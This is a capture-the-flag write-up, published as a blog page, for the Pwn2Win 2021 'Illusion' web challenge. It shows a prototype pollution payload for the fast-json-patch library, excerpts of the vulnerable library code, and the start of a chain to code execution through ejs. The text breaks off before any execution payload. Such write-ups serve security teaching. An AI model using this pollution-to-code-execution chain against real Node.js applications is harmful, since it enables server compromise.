@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Finger+Paint&family=Roboto:wght@100&display=swap" rel="stylesheet">
+        <link href="/fonts/meslo.ttf" rel="stylesheet">
+        <title>Pwn2Win Illusion challenge - Prototype Pollution to RCE</title>        
+    <link rel="stylesheet" href="/assets/404.b04bbdb6.css" />
+<link rel="stylesheet" href="/assets/_post_.e7f958bb.css" /></head>
+
+    <body class="
+        bg-gray-800/90
+        font-meslo
+
+        flex
+        flex-col
+
+        pt-[2%]
+        px-[15%]
+        gap-5
+
+        scrollbar-w-1
+        scrollbar-h-1
+        scrollbar
+        scrollbar-thumb-gray-800
+        scrollbar-track-black-800
+        hover:scrollbar-thumb-yellow-300 
+        hover:scrollbar-track-black-800
+    ">
+      <div class="
+        flex 
+        flex-row 
+        gap-5
+
+      ">
+        <div class="
+          flex
+          rounded-lg
+          bg-gray-800/30
+          
+          outline-dashed
+          outline-2
+          outline-yellow-300
+          shadow-lg shadow-black
+        ">
+          <div class="
+	rounded-lg
+	text-white
+	p-5
+">
+<div class="
+    p-4
+    font-bold
+    text-3xl
+    text-center
+    hover:animate-waving-hand
+">
+    <button onclick="
+        (document.referrer.includes(document.location.host)
+        && document.location.origin + '/' == document.referer
+        )
+        ? window.history.back()
+        : window.location.href = '/'
+    ">👈</button>
+</div>
+</div>
+        </div>
+        <div class="
+          rounded-lg
+          shrink grow
+          bg-gray-800/30
+          
+          outline-dashed
+          outline-2
+          outline-yellow-300
+          shadow-lg shadow-black
+          truncate
+        ">
+          <div class="
+	rounded-lg
+	text-white
+	p-5
+">
+<div class="
+  p-2
+	font-navpost
+	text-center
+  text-yellow-300
+  text-3xl
+  
+  transition 
+  ease-in-out 
+  hover:scale-105
+">
+	<a href="pwn2win-2021-illusion-web-challenge">
+		Pwn2Win Illusion challenge - Prototype Pollution to RCE
+	</a>
+</div>
+
+<p class="
+	font-sans
+	text-center
+  text-gray-300
+  
+  transition 
+  ease-in-out 
+  hover:scale-105
+  ">
+🕗 
+<span class="italic">
+	8 minutes.
+</span>
+</p>
+</div>
+        </div>
+      </div>
+
+    <div class="
+      bg-gray-800/30
+      rounded-lg
+      text-gray-300
+      tracking-wider
+      px-8
+      pb-2
+
+      cursor-auto
+
+      outline-dashed
+      outline-2
+      outline-yellow-300
+      shadow-2xl shadow-black
+
+      min-w-full
+      static
+      gap-1
+      leading-7
+
+      prose
+      prose-headings:text-yellow-300
+      prose-em:text-yellow-300
+
+      prose-a:text-yellow-300 
+      hover:prose-a:text-yellow-500
+      prose-a:cursor-pointer
+
+      prose-code:text-yellow-300
+      prose-code:before:content-['']
+      prose-code:after:content-['']
+
+      prose-strong:text-yellow-300
+      
+      prose-img:rounded-xl
+      prose-img:min-h-hpost
+      prose-img:max-h-hpost
+      prose-img:max-w-hpost
+      prose-img:w-wpost
+
+      prose-img:outline
+      prose-img:outline-offset-2 
+      prose-img:outline-2
+      prose-img:outline-yellow-300
+      
+      prose-pre:outline
+      prose-pre:outline-offset-2 
+      prose-pre:outline-2
+      prose-pre:outline-yellow-300
+      prose-pre:text-md
+
+      
+      text-lg
+      text-justify
+      prose-h1:before:content-['#_']
+      prose-h2:before:content-['#_']
+      prose-h3:before:content-['#_']
+      prose-h4:before:content-['#_']
+      prose-h5:before:content-['#_']
+      
+      prose-h1:text-2xl
+      prose-h2:text-xl
+      prose-h3:text-xl
+      prose-h4:text-xl
+      prose-h5:text-xl
+      
+      prose-h1:leading-8
+      prose-h2:leading-8
+      prose-h3:leading-8
+      prose-h4:leading-8
+      prose-h5:leading-8
+      
+      prose-h1:font-navpost
+      prose-h2:font-navpost
+      prose-h3:font-navpost
+      prose-h4:font-navpost
+      prose-h5:font-navpost
+
+      list-inside
+      marker:text-yellow-300
+    " id="post">
+      <div class="
+          prose-img:border-4
+          prose-img:border-gray-800
+          ">
+          <img src="/images/pwn2win-2021.jpeg">
+        </div>
+      <h2 id="introduction">Introduction</h2>
+<p>This write-up aims to demonstrate a solution for the <a href="https://pwn2.win/challenges/illusion" target="_blank" rel="noopener noreferrer">Illusion challenge</a>. For the following reading, it is highly recommended previously understanding the concept of <a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications" target="_blank" rel="noopener noreferrer">Prototype Pollution vulnerability</a>.</p>
+<p><strong>Table of contents</strong>:</p>
+<ul>
+<li><a href="#Recon">Recon</a></li>
+<li><a href="#Prototype-Pollution-in-fast-json-patch">Prototype Pollution in fast-json-patch</a></li>
+<li><a href="#Remote-Code-Execution-via-AST-Injection">Remote Code Execution via AST Injection</a></li>
+</ul>
+<p><strong>Resources</strong>: <a href="https://github.com/EffectRenan/CTF/tree/pwn2win-2021/web/Illusion" target="_blank" rel="noopener noreferrer">illusion.tar.gz and PoC</a>.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="dockerfile">Dockerfile</h3>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">FROM node:alpine</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">EXPOSE 1337</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">COPY flag.txt /root/flag.txt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">COPY readflag /</span></span>
+<span class="line"><span style="color: #F8F8F2">RUN chmod 4755 /readflag</span></span></code></pre>
+<p>The important information here is <code>readflag</code> binary. So we need to find a way to execute the <code>readflag</code> binary on the server machine to get the flag.</p>
+<h3 id="indexjs">index.js</h3>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> express </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'express'</span><span style="color: #F8F8F2">)</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> bodyParser </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'body-parser'</span><span style="color: #F8F8F2">)</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> jsonpatch </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'fast-json-patch'</span><span style="color: #F8F8F2">)</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> ejs </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'ejs'</span><span style="color: #F8F8F2">)</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> basicAuth </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'express-basic-auth'</span><span style="color: #F8F8F2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> app </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">express</span><span style="color: #F8F8F2">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #88846F">/* Middlewares */</span></span>
+<span class="line"><span style="color: #F8F8F2">app.</span><span style="color: #A6E22E">use</span><span style="color: #F8F8F2">(bodyParser.</span><span style="color: #A6E22E">json</span><span style="color: #F8F8F2">())</span></span>
+<span class="line"><span style="color: #F8F8F2">app.</span><span style="color: #A6E22E">use</span><span style="color: #F8F8F2">(</span><span style="color: #A6E22E">basicAuth</span><span style="color: #F8F8F2">({</span></span>
+<span class="line"><span style="color: #F8F8F2">    users: { </span><span style="color: #E6DB74">"admin"</span><span style="color: #F8F8F2">: process.env.SECRET </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"admin"</span><span style="color: #F8F8F2"> },</span></span>
+<span class="line"><span style="color: #F8F8F2">    challenge: </span><span style="color: #AE81FF">true</span></span>
+<span class="line"><span style="color: #F8F8F2">}))</span></span>
+<span class="line"></span></code></pre>
+<p>The web application was developed in Node.JS and the content is being hosted through <code>ExpressJS</code> framework. Also, there are two middlewares:</p>
+<ul>
+<li><code>bodyParser.json</code>: It allows us to send a JSON file content.</li>
+<li><code>basicAuth</code>: All requests must be authenticated.</li>
+</ul>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">let</span><span style="color: #F8F8F2"> services </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">    status: </span><span style="color: #E6DB74">"online"</span><span style="color: #F8F8F2">,</span></span>
+<span class="line"><span style="color: #F8F8F2">    cameras: </span><span style="color: #E6DB74">"online"</span><span style="color: #F8F8F2">,</span></span>
+<span class="line"><span style="color: #F8F8F2">    doors: </span><span style="color: #E6DB74">"online"</span><span style="color: #F8F8F2">,</span></span>
+<span class="line"><span style="color: #F8F8F2">    dome: </span><span style="color: #E6DB74">"online"</span><span style="color: #F8F8F2">,</span></span>
+<span class="line"><span style="color: #F8F8F2">    turrets: </span><span style="color: #E6DB74">"online"</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">app.</span><span style="color: #A6E22E">get</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"/"</span><span style="color: #F8F8F2">, </span><span style="color: #F92672">async</span><span style="color: #F8F8F2"> (</span><span style="color: #FD971F">req</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">res</span><span style="color: #F8F8F2">) </span><span style="color: #66D9EF">=></span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> html </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">await</span><span style="color: #F8F8F2"> ejs.</span><span style="color: #A6E22E">renderFile</span><span style="color: #F8F8F2">(__dirname </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"/templates/index.ejs"</span><span style="color: #F8F8F2">, {services})</span></span>
+<span class="line"><span style="color: #F8F8F2">    res.</span><span style="color: #A6E22E">end</span><span style="color: #F8F8F2">(html)</span></span>
+<span class="line"><span style="color: #F8F8F2">})</span></span></code></pre>
+<p>The homepage only returns the content of <code>index.ejs</code> template interpreted by <code>ejs</code> library.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">app.</span><span style="color: #A6E22E">post</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"/change_status"</span><span style="color: #F8F8F2">, (</span><span style="color: #FD971F">req</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">res</span><span style="color: #F8F8F2">) </span><span style="color: #66D9EF">=></span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">let</span><span style="color: #F8F8F2"> patch </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> []</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">    Object.</span><span style="color: #A6E22E">entries</span><span style="color: #F8F8F2">(req.body).</span><span style="color: #A6E22E">forEach</span><span style="color: #F8F8F2">(([</span><span style="color: #FD971F">service</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">status</span><span style="color: #F8F8F2">]) </span><span style="color: #66D9EF">=></span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (service </span><span style="color: #F92672">===</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"status"</span><span style="color: #F8F8F2">){</span></span>
+<span class="line"><span style="color: #F8F8F2">            res.</span><span style="color: #A6E22E">status</span><span style="color: #F8F8F2">(</span><span style="color: #AE81FF">400</span><span style="color: #F8F8F2">).</span><span style="color: #A6E22E">end</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Cannot change all services status"</span><span style="color: #F8F8F2">)</span></span>
+<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #F92672">return</span></span>
+<span class="line"><span style="color: #F8F8F2">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">        patch.</span><span style="color: #A6E22E">push</span><span style="color: #F8F8F2">({</span></span>
+<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #E6DB74">"op"</span><span style="color: #F8F8F2">: </span><span style="color: #E6DB74">"replace"</span><span style="color: #F8F8F2">,</span></span>
+<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #E6DB74">"path"</span><span style="color: #F8F8F2">: </span><span style="color: #E6DB74">"/"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> service,</span></span>
+<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #E6DB74">"value"</span><span style="color: #F8F8F2">: status</span></span>
+<span class="line"><span style="color: #F8F8F2">        })</span></span>
+<span class="line"><span style="color: #F8F8F2">    });</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">    jsonpatch.</span><span style="color: #A6E22E">applyPatch</span><span style="color: #F8F8F2">(services, patch)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (</span><span style="color: #E6DB74">"offline"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">in</span><span style="color: #F8F8F2"> Object.</span><span style="color: #A6E22E">values</span><span style="color: #F8F8F2">(services)){</span></span>
+<span class="line"><span style="color: #F8F8F2">        services.status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"offline"</span></span>
+<span class="line"><span style="color: #F8F8F2">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">    res.</span><span style="color: #A6E22E">json</span><span style="color: #F8F8F2">(services)</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span></code></pre>
+<p>The endpoint <code>change_status</code> accepts a <code>POST</code> request and expects a JSON file content. In the line <code>5</code>, the <code>Object.entries</code> get the properties of the JSON file, which <code>service</code> represents the property name and <code>status</code> represents the content.</p>
+<p>In the line <code>12</code>, the array <code>patch</code> pushes an object based on the service and status provided by the request data. In the line <code>19</code>, the function <code>applyPatch</code> is called based on the services and the array updated before.</p>
+<p>With all information from the source code and our goal to execute OS commands on the server, the app is working with JSON files and we might guess that something related to <code>Prototype Pollution</code> vulnerability can be exploitable. Therefore, the line <code>19</code> is the only that looks promising for this guessing. So we have to look at the source code of <code>fast-json-patch</code> library and analyze what the <code>applyPatch</code> function does.</p>
+<p>Before, we can search for some vulnerabilities in this library. Looking at the <a href="https://github.com/Starcounter-Jack/JSON-Patch/pull/262" target="_blank" rel="noopener noreferrer">PRs</a> on GitHub repository, we can find a <code>Prototype Pollution</code> vulnerability reported by <a href="https://huntr.dev/users/alromh87" target="_blank" rel="noopener noreferrer">Alejandro Romero (alromh87)</a> through <a href="https://huntr.dev/" target="_blank" rel="noopener noreferrer">Huntr</a> platform, which was not patched yet.</p>
+<h2 id="prototype-pollution-in-fast-json-patch">Prototype Pollution in fast-json-patch</h2>
+<p>We already have the payload to exploit <code>Prototype Pollution</code> provided by the disclosure, but let’s look at how this vulnerability happens.</p>
+<p>Payload:</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> fastjsonpatch </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'fast-json-patch'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> a </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {};</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> patch </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> [{op: </span><span style="color: #E6DB74">"replace"</span><span style="color: #F8F8F2">, path: </span><span style="color: #E6DB74">"/constructor/prototype/polluted"</span><span style="color: #F8F8F2">, value: </span><span style="color: #E6DB74">"Yes! Its Polluted"</span><span style="color: #F8F8F2">}];</span></span>
+<span class="line"><span style="color: #F8F8F2">fastjsonpatch.</span><span style="color: #A6E22E">applyPatch</span><span style="color: #F8F8F2">(a, patch);</span></span></code></pre>
+<h3 id="vulnerable-code">Vulnerable code</h3>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">applyPatch</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">document</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">patch</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">validateOperation</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">mutateDocument</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">banPrototypeModifications</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> results </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Array</span><span style="color: #F8F8F2">(patch.length);</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> i </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, length_1 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> patch.length; i </span><span style="color: #F92672">&#x3C;</span><span style="color: #F8F8F2"> length_1; i</span><span style="color: #F92672">++</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">        results[i] </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">applyOperation</span><span style="color: #F8F8F2">(document, patch[i], validateOperation, </span><span style="color: #AE81FF">true</span><span style="color: #F8F8F2">, banPrototypeModifications, i);</span></span>
+<span class="line"><span style="color: #F8F8F2">        document </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> results[i].newDocument;</span></span>
+<span class="line"><span style="color: #F8F8F2">    }</span></span>
+<span class="line"><span style="color: #F8F8F2">    results.newDocument </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document;</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> results;</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span></code></pre>
+<p>Based on the payload, the parameter <code>document</code> represents the empty object <code>a</code>. Looking at the line <code>6</code>, the function <code>applyOperation</code> is called, which our empty object <code>a</code> is the first parameter and the single object inside the <code>patch</code> array is the second parameter.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">applyOperation</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">document</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">operation</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">validateOperation</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">mutateDocument</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">banPrototypeModifications</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">index</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">...</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (operation.path </span><span style="color: #F92672">===</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">...</span></span>
+<span class="line"><span style="color: #F8F8F2">    } </span><span style="color: #F92672">else</span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> path </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> operation.path </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> keys </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> path.</span><span style="color: #A6E22E">split</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'/'</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> obj </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document;</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> t </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> len </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> keys.length;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">while</span><span style="color: #F8F8F2"> (</span><span style="color: #AE81FF">true</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">            key </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> keys[t];</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">            t</span><span style="color: #F92672">++</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (</span><span style="color: #F92672">...</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">                </span><span style="color: #F92672">...</span></span>
+<span class="line"><span style="color: #F8F8F2">            } </span><span style="color: #F92672">else</span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">                </span><span style="color: #F92672">...</span></span>
+<span class="line"><span style="color: #F8F8F2">                </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (t </span><span style="color: #F92672">>=</span><span style="color: #F8F8F2"> len) {</span></span>
+<span class="line"><span style="color: #F8F8F2">                    </span></span>
+<span class="line"><span style="color: #F8F8F2">                    </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> returnValue </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> objOps[operation.op].</span><span style="color: #A6E22E">call</span><span style="color: #F8F8F2">(operation, obj, key, document);</span></span>
+<span class="line"><span style="color: #F8F8F2">                    </span><span style="color: #F92672">...</span></span>
+<span class="line"><span style="color: #F8F8F2">                    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> returnValue;</span></span>
+<span class="line"><span style="color: #F8F8F2">                }</span></span>
+<span class="line"><span style="color: #F8F8F2">            }</span></span>
+<span class="line"><span style="color: #F8F8F2">            obj </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> obj[key];</span></span>
+<span class="line"><span style="color: #F8F8F2">        }</span></span>
+<span class="line"><span style="color: #F8F8F2">    }</span></span></code></pre>
+<p>Now the payload makes sense. In the line <code>7</code>, our path <code>/constructor/prototype/polluted</code> is split by <code>/</code> and it stores the result into the <code>keys</code> variable. The empty object <code>a</code> now is referenced by <code>obj</code>. The variable <code>t</code> represents a counter for the while loop.</p>
+<p>As the <code>keys</code> array has 3 values, the while repeats 3 times. The <code>else</code> statement is executed only in the last time, in other words, when <code>key</code> variable represents the content <code>polluted</code>.</p>
+<p>In the line <code>23</code>, the <code>objOps</code> represents all functions available to use. For our payload, <code>operation.op</code> represents the string <code>replace</code>. Thus, the replace function is finally called.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> objOps </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">...</span></span>
+<span class="line"><span style="color: #F8F8F2">     ,</span></span>
+<span class="line"><span style="color: #F8F8F2">     </span><span style="color: #A6E22E">replace</span><span style="color: #F8F8F2">: </span><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> (</span><span style="color: #FD971F">obj</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">key</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">document</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">         </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> removed </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> obj[key];</span></span>
+<span class="line"><span style="color: #F8F8F2">         obj[key] </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">this</span><span style="color: #F8F8F2">.value;</span></span>
+<span class="line"><span style="color: #F8F8F2">         </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> { newDocument: document, removed: removed };</span></span>
+<span class="line"><span style="color: #F8F8F2">     }</span></span>
+<span class="line"><span style="color: #F8F8F2">     ,</span></span>
+<span class="line"><span style="color: #F8F8F2">     </span><span style="color: #F92672">...</span></span></code></pre>
+<p>The behavior of the <code>replace</code> function is shown above. The explanation of Prototype Pollution be exploitable is the fact of the replace function is based on the last object property provided. We can notice our payload <code>/constructor/prototype/polluted</code> was split and became an array, like <code>["constructor", "prototype", "polluted"]</code>. Therefore, in the last step when the <code>replace</code> function is called, the last object was the <code>prototype</code> itself. Consequently, the <code>applyOperation</code> function does something similar to: <code>obj["constructor"]["prototype"]["polluted"] = "Yes! Its Polluted"</code>.</p>
+<h2 id="remote-code-execution-via-ast-injection">Remote Code Execution via AST Injection</h2>
+<h3 id="ast-injection">AST Injection</h3>
+<p>Briefly, <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree" target="_blank" rel="noopener noreferrer">Abstract Syntax Tree</a> injection is a type of vulnerability in which is possible to inject AST in some context. In some cases, the impact of this vulnerability is the influence of the parsing or compiling process, which will lead to code execution. To know more about this, check the <a href="https://blog.p6.is/AST-Injection/" target="_blank" rel="noopener noreferrer">blog post</a> out published by <a href="https://twitter.com/po6ix" target="_blank" rel="noopener noreferrer">POSIX</a> (it has great examples showing similar scenarios).</p>
+<p>As we have a possibility to create any object property with Prototype Pollution, it is possible to change/create a property to influence the compiling process.</p>
+<p>The template engines are great to explore AST injection. In our recon step, we noticed that the app is using the template engine <code>ejs</code> when we make a GET request to homepage. Hence, we need to find where in the code is sensitive to this exploration based on <code>ejs.renderFile</code>.</p>
+<h3 id="ast-injection-in-ejs">AST injection in ejs</h3>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">exports</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">renderFile</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> () {</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> args </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">Array</span><span style="color: #F8F8F2">.prototype.slice.</span><span style="color: #A6E22E">call</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">arguments</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> filename </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> args.</span><span style="color: #A6E22E">shift</span><span style="color: #F8F8F2">();</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> cb;</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> opts </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {filename: filename};</span></span>
